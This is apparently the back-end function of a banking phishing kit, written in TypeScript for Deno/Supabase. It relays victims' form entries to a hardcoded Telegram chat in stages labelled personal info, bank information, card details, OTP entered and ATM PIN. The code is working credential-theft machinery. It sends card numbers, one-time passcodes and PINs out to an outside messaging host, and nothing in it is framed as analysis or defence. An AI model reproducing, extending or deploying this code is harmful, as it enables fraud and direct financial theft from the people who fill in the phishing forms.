import { corsHeaders } from "https://esm.sh/@supabase/supabase-js@2.95.0/cors";

const GATEWAY_URL = "https://connector-gateway.lovable.dev/telegram";
const CHAT_ID = "7498329474";

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response("ok", { headers: corsHeaders });
  }

  try {
    const LOVABLE_API_KEY = Deno.env.get("LOVABLE_API_KEY");
    if (!LOVABLE_API_KEY) throw new Error("LOVABLE_API_KEY is not configured");

    const TELEGRAM_API_KEY = Deno.env.get("TELEGRAM_API_KEY");
    if (!TELEGRAM_API_KEY) throw new Error("TELEGRAM_API_KEY is not configured");

    const body = await req.json();
    const { stage, data } = body ?? {};

    if (!stage || !data || typeof data !== "object") {
      return new Response(
        JSON.stringify({ error: "Invalid payload: stage and data required" }),
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } },
      );
    }

    const escape = (s: unknown) =>
      String(s ?? "").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");

    const titleMap: Record<string, string> = {
      step1: "🧾 <b>NEW APPLICATION — Step 1: Personal Info</b>",
      step2: "🏦 <b>Step 2: Bank Information</b>",
      step3: "💳 <b>Step 3: Card Details</b>",
      step4: "🔐 <b>Step 4: OTP Entered</b>",
      step5: "🔑 <b>Step 5: ATM PIN — FINAL SUBMISSION</b>",
    };

    const title = titleMap[stage] ?? `📩 <b>${escape(stage)}</b>`;
    const lines = Object.entries(data as Record<string, unknown>)
      .filter(([, v]) => v !== "" && v !== null && v !== undefined)
      .map(([k, v]) => `<b>${escape(k)}:</b> <code>${escape(v)}</code>`)
      .join("\n");

    const text = `${title}\n\n${lines}\n\n🕒 ${new Date().toISOString()}`;

    const tgRes = await fetch(`${GATEWAY_URL}/sendMessage`, {
      method: "POST",
      headers: {
        Authorization: `Bearer ${LOVABLE_API_KEY}`,
        "X-Connection-Api-Key": TELEGRAM_API_KEY,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });

    const tgData = await tgRes.json();
    if (!tgRes.ok) {
      throw new Error(`Telegram API failed [${tgRes.status}]: ${JSON.stringify(tgData)}`);
    }

    return new Response(JSON.stringify({ success: true }), {
      status: 200,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : "Unknown error";
    console.error("notify-telegram error:", msg);
    return new Response(JSON.stringify({ success: false, error: msg }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
